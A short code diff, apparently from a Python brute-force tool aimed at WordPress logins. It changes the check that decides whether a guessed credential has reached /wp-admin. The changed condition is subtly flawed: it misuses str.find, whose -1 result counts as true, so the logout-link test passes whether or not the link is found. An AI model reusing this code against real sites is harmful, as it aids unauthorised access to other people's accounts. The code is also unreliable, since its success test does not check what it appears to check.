@@ -35,7 +35,7 @@ def brut(string):
         print('ERROR')
         return False
     response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 30)
-    if response.text.find('action=logout')>0:
+    if response.text.find('action=logout') and response.text.find('profile.php')  >0:
         return True
     else:
         return False
